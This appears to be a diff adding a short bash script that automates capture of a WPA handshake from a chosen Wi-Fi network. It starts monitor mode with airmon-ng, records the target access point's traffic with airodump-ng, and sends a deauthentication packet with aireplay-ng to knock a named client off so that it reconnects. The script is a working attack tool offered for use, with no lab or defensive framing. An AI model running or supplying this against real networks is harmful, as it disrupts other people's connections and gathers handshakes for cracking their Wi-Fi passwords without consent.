@@ -1,0 +1,53 @@
+#!/bin/bash
+function usage
+{
+    echo "usage: startcapture -i INTERFACE -c CHANNEL -b BSSID -w WIRELESS-CLIENT -f FILENAME"
+}
+
+function checkemptyargs #Not being called as of now
+{
+	array=("$@");
+	for i in "${array[@]}"
+	do
+		if [ -z "$i" ]; then
+			usage
+		fi
+	done
+}
+
+if [ $# -lt 1 ]; then
+    usage
+fi
+
+while [ "$1" != "" ]; do
+    case $1 in
+        -i | --interface )      shift
+                                interface=$1
+                                ;;
+        -c | --channel )    	shift
+				channel=$1
+                                ;;
+        -f | --filename )       shift
+                                filename=$1
+                                ;;
+        -b | --bssid )		shift
+                                bssid=$1
+                                ;;
+        -w | --wireless-client ) shift
+                                 client=$1
+                                ;;
+
+        -h | --help )           usage
+                                exit
+                                ;;
+        * )                     usage
+                                exit 1
+    esac
+    shift
+done
+
+#checkemptyargs $interface $channel $bssid $client $filename
+airmon-ng start $interface $channel
+timeout 300 airodump-ng -c $channel --bssid $bssid -w $filename $interface &
+aireplay-ng -0 1 -a $bssid -c $client $interface
+fg
